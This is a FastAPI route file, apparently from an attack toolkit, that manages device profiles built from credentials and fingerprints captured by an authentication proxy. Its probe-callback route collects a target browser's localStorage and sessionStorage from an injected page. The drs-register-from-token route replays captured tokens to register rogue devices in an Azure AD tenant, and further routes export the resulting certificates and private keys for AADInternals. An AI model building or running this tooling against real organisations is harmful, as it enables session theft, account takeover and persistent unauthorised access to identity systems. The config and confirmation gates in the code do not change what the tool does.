"""REST routes for device profiles. Mounted at /api/devices."""

from __future__ import annotations

from fastapi import APIRouter, Body, HTTPException, Query, Request
from fastapi.responses import Response

from backend import devices as _dev


router = APIRouter()


@router.get("")
async def list_devices():
    return {"devices": _dev.list_all()}


@router.get("/presets")
async def list_presets():
    return {"presets": _dev.list_presets()}


@router.get("/fingerprint-summary")
async def fingerprint_summary():
    """One-shot read for the Fingerprint settings tab — pulls the
    YAML-driven body-capture allowlist, captured-fingerprint count,
    device-profile count, and DRS-credential count without the UI
    having to fan out across multiple endpoints."""
    from backend import drs_register as _drs
    from backend import auth_proxy as _ap
    from backend import site_rules as _sr
    captured = _ap.list_captured_hostnames()
    fp_hosts = [h for h in captured
                if (h.get("fingerprint") or {}).get("ua")]
    return {
        "captured_fingerprints": [
            {
                "hostname": h["hostname"],
                "ua": (h.get("fingerprint") or {}).get("ua", ""),
                "family": (h.get("fingerprint") or {}).get("family", ""),
                "hints": (h.get("fingerprint") or {}).get("hints", 0),
                "captured_at": h.get("captured_at"),
            }
            for h in fp_hosts
        ],
        "device_profile_count": len(_dev.list_all()),
        "drs_credential_count": len(_drs.list_credentials()),
        "body_capture_hostnames": _sr.body_capture_hostnames(),
    }


@router.get("/{device_id}")
async def get_device(device_id: str):
    rec = _dev.get(device_id)
    if not rec:
        raise HTTPException(status_code=404, detail="device not found")
    return rec


@router.post("")
async def create_device(profile: dict = Body(...)):
    """Manual or preset registration. Body shape:
    {
      "preset_id": "iphone-15-safari",       # optional
      "name": "...", "fingerprint": {...},   # optional overrides
      "viewport": {...}, "device_scale_factor": ...,
      "is_mobile": false, "has_touch": false,
      "locale": "...", "timezone_id": "...",
      "engine_family": "...", "channel": "...",
      "impersonate_tag": "...", "notes": "..."
    }
    """
    return _dev.register_manual(profile or {})


@router.patch("/{device_id}")
async def update_device(device_id: str, patch: dict = Body(...)):
    if not _dev.get(device_id):
        raise HTTPException(status_code=404, detail="device not found")
    return await _dev.update(device_id, patch or {})


@router.delete("/{device_id}")
async def delete_device(device_id: str):
    ok = _dev.delete(device_id)
    return {"ok": bool(ok), "device_id": device_id}


@router.post("/from-capture")
async def register_from_capture(body: dict = Body(...)):
    host = body.get("hostname") or ""
    modes = body.get("modes") or []
    sites = body.get("sites") or None
    name = body.get("name") or None
    if not host:
        raise HTTPException(status_code=400, detail="hostname required")
    rec = _dev.register_from_capture(host, list(modes), sites=sites,
                                      name=name)
    pending = _dev.get_pending_probe(host)
    return {
        "device": rec,
        "probe_token": (pending or {}).get("token"),
        "probe_url": f"http://{host}/" if pending else None,
    }


@router.post("/from-session")
async def register_from_session_route(body: dict = Body(...)):
    """Snapshot a live :8091 Playwright session into a device profile.
    Body: {session_id, modes?, name?, sites?}"""
    sid = body.get("session_id") or ""
    if not sid:
        raise HTTPException(status_code=400, detail="session_id required")
    from backend.routes.browser import _live_pages
    page = _live_pages.get(sid)
    if page is None:
        raise HTTPException(status_code=404,
                             detail=f"no live session {sid}")
    modes = list(body.get("modes") or ["passive"])
    name = body.get("name") or None
    sites = body.get("sites") or None
    rec = await _dev.register_from_session(page, modes, name=name,
                                             sites_filter=sites)
    return {"device": rec}


@router.post("/drs-analyze-token")
async def drs_analyze_token(body: dict = Body(...)):
    """Inspect a token without registering. Returns claim summary +
    `valid_for_drs`. Used by the Flow Trace UI to populate the
    confirmation modal before the operator clicks Register."""
    from backend import drs_register as _drs
    token = (body or {}).get("token") or ""
    if not token:
        raise HTTPException(status_code=400, detail="token required")
    return _drs.analyze_token(token)


@router.post("/drs-register-from-token")
async def drs_register_from_token(body: dict = Body(...)):
    """Replay a device registration against AAD DRS. Two-step gate:
    `allow_drs_replay` config must be on AND the request body must
    set `confirm: true`. Mutates state on the IdP tenant."""
    from backend import drs_register as _drs
    body = body or {}
    token = body.get("token") or ""
    if not token:
        raise HTTPException(status_code=400, detail="token required")
    return await _drs.attempt_registration(
        token,
        device_name=body.get("device_name") or "",
        join_type=int(body.get("join_type") or 0),
        os_version=body.get("os_version") or "10.0.19045.0",
        confirm=bool(body.get("confirm")),
    )


@router.get("/drs-credentials")
async def drs_credentials():
    """List registered device credentials (private keys redacted)."""
    from backend import drs_register as _drs
    return {"credentials": _drs.list_credentials()}


@router.get("/drs-credentials/{cred_id}")
async def drs_credential_get(cred_id: str):
    from backend import drs_register as _drs
    rec = _drs.get_credential(cred_id)
    if not rec:
        raise HTTPException(status_code=404, detail="credential not found")
    return rec


@router.delete("/drs-credentials/{cred_id}")
async def drs_credential_delete(cred_id: str):
    from backend import drs_register as _drs
    return {"ok": _drs.delete_credential(cred_id), "id": cred_id}


@router.get("/drs-credentials/{cred_id}/pfx")
async def drs_credential_pfx(cred_id: str,
                              password: str = Query(default="")):
    """Export the credential's cert+key as a PKCS#12 (.pfx) bundle for
    AADInternals / curl --cert / openssl s_client. Pass ?password=…
    for an encrypted PFX; default is unprotected."""
    from backend import drs_register as _drs
    blob = _drs.build_pfx(cred_id, password=password)
    if not blob:
        raise HTTPException(
            status_code=404,
            detail="credential not found or missing cert/key")
    rec = _drs.get_credential(cred_id) or {}
    name = (rec.get("name") or cred_id).replace("/", "_")
    return Response(
        content=blob, media_type="application/x-pkcs12",
        headers={"Content-Disposition":
                 f'attachment; filename="{name}.pfx"'})


@router.get("/drs-credentials/{cred_id}/cert")
async def drs_credential_cert(cred_id: str):
    """Download the issued cert as PEM."""
    from backend import drs_register as _drs
    rec = _drs.get_credential(cred_id)
    if not rec or not rec.get("cert_pem"):
        raise HTTPException(status_code=404, detail="cert not found")
    name = (rec.get("name") or cred_id).replace("/", "_")
    return Response(
        content=rec["cert_pem"], media_type="application/x-pem-file",
        headers={"Content-Disposition":
                 f'attachment; filename="{name}.crt"'})


@router.get("/drs-credentials/{cred_id}/key")
async def drs_credential_key(cred_id: str):
    """Download the private key as PEM. Sensitive — gated by the
    standard API-key middleware like every other route."""
    from backend import drs_register as _drs
    rec = _drs.get_credential(cred_id)
    if not rec or not rec.get("key_pem"):
        raise HTTPException(status_code=404, detail="key not found")
    name = (rec.get("name") or cred_id).replace("/", "_")
    return Response(
        content=rec["key_pem"], media_type="application/x-pem-file",
        headers={"Content-Disposition":
                 f'attachment; filename="{name}.key"'})


@router.post("/probe-callback")
async def probe_callback(
    request: Request,
    token: str = Query(default=""),
    device_id: str = Query(default=""),
    host: str = Query(default=""),
):
    """Receives the synthetic-page POST that runs in the subject's
    browser. The token + host pair must match a pending probe.
    """
    if not (token and device_id and host):
        raise HTTPException(status_code=400,
                            detail="token, device_id, host required")
    if not _dev.consume_probe(host, token, device_id):
        raise HTTPException(status_code=403,
                            detail="invalid or expired probe token")
    try:
        body = await request.json()
    except Exception:
        body = {}
    probed = {
        "tz": body.get("tz"),
        "languages": body.get("languages") or [],
        "platform": body.get("platform"),
        "screen": body.get("screen") or {},
        "viewport": body.get("viewport") or {},
        "hardware_concurrency": body.get("hardware_concurrency"),
        "device_memory": body.get("device_memory"),
    }
    rec = _dev.apply_probe_result(
        device_id, probed,
        hostname=host,
        local_storage=body.get("local_storage") or None,
        session_storage=body.get("session_storage") or None,
    )
    if not rec:
        raise HTTPException(status_code=404, detail="device not found")
    return {"ok": True, "device_id": device_id, "host": host}
